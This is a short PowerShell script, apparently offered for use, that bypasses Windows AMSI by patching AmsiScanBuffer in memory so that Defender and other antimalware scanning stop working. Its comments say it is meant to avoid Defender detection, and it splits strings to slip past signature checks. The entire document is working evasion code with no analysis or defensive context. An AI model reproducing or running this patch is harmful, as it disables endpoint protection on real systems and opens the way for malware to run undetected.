# AMSI Bypass 2025 - Patch at offset 0x14 (not entry point)
# Based on r-tec research - avoids Defender memory scan detection

$W=@"
using System;using System.Runtime.InteropServices;
public class W{
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr m,string p);
[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);
}
"@
Add-Type $W
$L=[W]::LoadLibrary("am"+"si.dll")
$A=[W]::GetProcAddress($L,"Amsi"+"Scan"+"Buffer")
$p=0
[W]::VirtualProtect($A,[UIntPtr]::new(0x20),0x40,[ref]$p)|Out-Null
# Patch at offset 0x14: POP R15, POP R14, POP RDI, MOV EAX E_INVALIDARG, RET
$B=[Byte[]](0x41,0x5F,0x41,0x5E,0x5F,0xB8,0x57,0x00,0x07,0x80,0xC3)
$A=[Int64]$A+0x14
[Runtime.InteropServices.Marshal]::Copy($B,0,[IntPtr]$A,$B.Length)
[W]::VirtualProtect([IntPtr]$A,[UIntPtr]::new(0x20),$p,[ref]$p)|Out-Null
